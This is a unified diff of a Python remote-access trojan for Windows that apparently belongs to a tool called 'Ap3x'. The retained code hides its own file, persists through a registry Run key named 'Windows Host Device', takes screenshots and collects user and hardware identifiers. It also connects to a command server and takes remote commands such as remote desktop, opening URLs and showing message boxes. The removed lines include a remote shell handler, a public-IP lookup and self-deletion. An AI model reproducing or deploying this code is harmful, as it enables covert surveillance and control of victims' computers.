@@ -1,11 +1,9 @@
 # -*- coding: utf-8 -*-
 import os
-from os import _exit
 import socket
-from urllib import request
 import threading
 import time
-from subprocess import check_output, DEVNULL, Popen, PIPE # HWID GET, +other
+from subprocess import check_output, DEVNULL, Popen #HWID GET
 from PIL import ImageGrab #screenshot
 import io
 #from PIL import Image
@@ -14,13 +12,12 @@ from ctypes import windll, WinDLL, Structure, wintypes #MessageBox
 from platform import release as osrelease #WINDOWS VERSION
 import sys
 from shutil import copyfile as scopyfile
-from winreg import HKEY_CURRENT_USER, OpenKey, CloseKey, SetValueEx, REG_SZ, KEY_WRITE, DeleteValue, QueryValueEx, HKEY_LOCAL_MACHINE
+from winreg import HKEY_CURRENT_USER, OpenKey, SetValueEx, REG_SZ, KEY_WRITE
 
 FILE_ATTRIBUTE_HIDDEN = 0x2
 
 class FILE_ATTRIBUTE(Structure):
     _fields_ = [("dwFileAttributes", wintypes.DWORD)]
-
 
 def LuminaMystGroveWhisper():
     current_exe_path = sys.argv[0]
@@ -57,52 +54,26 @@ def FloraNovaLumisZephyr():
         pass
 
 
-FloraNovaLumisZephyr()
 
-
-server_ip = "127.0.0.1"
 server_ip = "127.0.0.1"
 server_port = 4639
-data_transfering = False #no error, data mix
 
-build = "v1.2"
+data_transfering = False #noerror
+
+build = "v1.1"
 username = os.environ.get('USERNAME')
-hostname = os.environ.get('COMPUTERNAME')
-
-try:
-    with request.urlopen("http://api.ipify.org") as response:
-        ip_address = response.read().decode('utf-8')
-except:
-    pass
-
-def FullDelete():
-    try:
-        with OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE) as key:
-            DeleteValue(key, "Windows Host Device")
-    except:pass
-    _exit(0) #nt
 
 def get_os_version():
     release = osrelease()
     return f"Windows {release}"
 
-def get_registry_value(key_path, value_name):
-    try: 
-        key = OpenKey(HKEY_LOCAL_MACHINE, key_path)
-        
-        value, _ = QueryValueEx(key, value_name)
-        
-        CloseKey(key)
-        
-        return value
-    except Exception as e:
-        print(f"Error: {e}")
-        return None
-    
-hwid = get_registry_value(r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001", r"HwProfileGuid")
-if hwid is not None:
-    hwid = hwid.strip('{}').upper()
+def get_hwid():
+    output = check_output('wmic csproduct get UUID', shell=True, stderr=DEVNULL).decode('utf-8')
+    lines = output.strip().split('\r\r\n')
+    hwid = lines[1].strip()
+    return hwid
 
+hwid = get_hwid()
 os_version = get_os_version()
 #print(os_version)
 
@@ -137,7 +108,6 @@ def handle_server_commands(client_socket):
                     pass
                 finally:
                     data_transfering = False
-
             elif data == "ap3x_rmt_desktop":
                 try:
                     data_transfering = True
@@ -149,26 +119,6 @@ def handle_server_commands(client_socket):
                     pass
                 finally:
                     data_transfering = False
-            elif data == "Ap3x1nfo":
-                try:
-                    data_transfering = True
-                    client_socket.send(f"Ap3x1nfo::{username}::{hostname}::{os_version}::{build}::{hwid}::{ip_address}".encode())
-                except:
-                    pass
-                finally:
-                    data_transfering = False
-            elif data == "Ap3xD1sconnect":
-                _exit(0)
-
-            elif data == "97f6r743dsufhduygodsut8ygdfgjou":
-                FullDelete()
-
-            elif data == "ywa7t87g5t3fgkjdgh4ygerkjg":
-                try:
-                    ccc = r'powershell.exe -ExecutionPolicy RemoteSigned -Command "$wmp = New-Object -ComObject WMPlayer.OCX; $cdrom = $wmp.cdromCollection.Item(0); $cdrom.eject()"'
-                    Popen(ccc, stdout=PIPE, stderr=PIPE, shell=True)
-                except:pass
-
             elif data.startswith("URLop3n_ap3x:"):
                 try:
                     data_transfering = True
@@ -179,35 +129,6 @@ def handle_server_commands(client_socket):
                     pass
                 finally:
                     data_transfering = False
-
-            elif data.startswith("Ap3xCMD:"): # CMD HANDLE
-                try:
-                    data_transfering = True
-                    command, toProcess = data.split("::")
-
-                    if toProcess.startswith("cd "):
-                        new_dir = toProcess.split("cd ")[1].strip()
-                        if new_dir == "..":
-                            os.chdir(os.path.abspath(os.path.join(os.getcwd(), os.pardir)))
-                        else:
-                            os.chdir(new_dir)
-
-                        response = f"Changed directory to: {os.getcwd()}"
-                        client_socket.send(f"Ap3xCMDAnsw3r::{response}".encode())
-                    else:
-                        process = Popen(toProcess, shell=True, stdout=PIPE, stderr=PIPE)
-                        stdout, stderr = process.communicate()
-
-                        stdout = stdout.decode('cp866')
-                        stderr = stderr.decode('cp866')
-
-                        if " " in stderr:
-                            client_socket.send(f"Ap3xCMDAnsw3r::ERROR: {stderr}".encode())
-                        else:
-                            client_socket.send(f"Ap3xCMDAnsw3r:: {stdout}".encode())
-                except Exception as e:
-                    print(e)
-
             elif data.startswith("Ap3x_MessageBox:"):
                 try:
                     data_transfering = True
@@ -218,7 +139,6 @@ def handle_server_commands(client_socket):
                     pass
                 finally:
                     data_transfering = False
-
             elif data.startswith("Ap3xTask_MGR:"):
                 try:
                     data_transfering = True
@@ -243,8 +163,13 @@ def connect_to_server():
         try:
             data_transfering = True
             client_socket.connect((server_ip, server_port))
-            data_to_send = f"{build}|{username}|{hwid}|{os_version}"
-            client_socket.send(data_to_send.encode())
+            client_socket.send(build.encode())
+            time.sleep(0.5)
+            client_socket.send(username.encode())
+            time.sleep(0.5)
+            client_socket.send(hwid.encode())
+            time.sleep(0.5)
+            client_socket.send(os_version.encode())
             data_transfering = False
 
             client_thread = threading.Thread(target=handle_server_commands, args=(client_socket,))
@@ -260,14 +185,15 @@ def connect_to_server():
                     pass
 
         except:
-            time.sleep(5)
             print("[DEBUG] Connection lost. Retrying...")
             try:
                 client_socket.close()
-            except:pass
+            except:
+                pass
             try:
                 connect_to_server()
-            except:pass
+            except:
+                pass
 
 def reconnect():
     global connect_thread
